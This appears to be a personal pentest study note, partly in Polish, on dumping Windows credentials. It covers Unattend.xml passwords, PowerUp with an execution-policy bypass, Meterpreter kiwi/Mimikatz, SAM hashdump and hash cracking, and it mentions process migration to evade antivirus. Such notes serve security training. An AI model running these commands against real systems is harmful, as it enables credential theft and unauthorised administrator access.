# Windows Credential Dumping

## Unattended Windows Setup utility

Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.

This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.  
If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.

The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:

- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

Hasła ukryte w plikach czasem moga być zakodowane Base64

```xml
Szukać sekcji:
<Autologon>
```

```powershell
Powershell.exe
cd .\Desktop\PowerSploit\Privesc\
powershell -ep bypass # PowerShell execution policy bypass
. .\PowerUp.ps1 # Import PowerUp.ps1 script
Invoke-PrivescAudit # Invoke-PrivescAudit function.

# Decoding administrator password using Powershell.
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password

# run a command prompt as an administrator using discover credentials using runas.exe utility
runas.exe /user:administrator cmd
Admin@123
whoami
```

## Dumping Hashes With Mimikatz

![[Tools/mimikatz#Dumping Hashes With Mimikatz]]

### $ msf>kiwi (Mimikatz)
The **SAM (Security Account Manager) database**, is a database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely.
```bash
# w sesji meterpretera
pgrep lsass # usługa odpowiedzialna za managing Windows Acces Token
migrate # trzeba zmigrować do procesu x64 (w x86 mimikatz nie będzie działac poprawnie)
load kiwi
creds_all # This will grab all of the credentials in RAM and dispaly them to the screen
lsa_dump_sam #  Extract all the users NTLM hash using Kiwi
lsa_dump_secrets # Find the syskey by dumping the LSA secrets.
```

```bash
# dump hashy maszyny do bazy Metasploit (ocdczytać za pomocą `creds`)

# This module will collect cleartext Single Sign On credentials from the Local Security Authority using the Kiwi (Mimikatz) extension.
post/windows/gather/credentials/sso

# This module will dump the local user accounts from the SAM database using the registry
windows/gather/hashdump

# This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account Database using the proper technique depending on privilege level, OS and role of the host.
windows/gather/smart_hashdump
```


# Dumping & Cracking Hashes

The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.  
SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.

LSASS process  
Why migrate?

- **Stability**: Exploits and Payloads that are providing the session tend to be unstable as compared to the basic process that has been developed for the target and is running on the target. Hence, migrating to those processes can serve to provide a more stable connection.
- **Cloaking**: Antivirus Software or any other Defensive Software tends to scan and look for malicious files that might be running on the machine. Hence, Cloaking or Hiding our malicious process will avoid detection.
- **Compatibility**: It is possible that while exploiting a machine that the payload you used might be designed for the 64-bit Architecture but the session that you have received is an Operating System running an 86-bit Architecture. Migrate can be used to shift the process to the native process and provide compatibility to the session.

```bash
post/windows/gather/hashdump # moduł zapisujący hashe do bazy metasploit
auxiliary/analyze/jtr_crack_fast # JtR
```
```bash
meterpreter>hashdump
# skopiować wyświetlone hashe i zapisać w pliku
# crack hashy za pomocą john lub hashcat

# moduł password cracker to decode Windows based password hashes
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```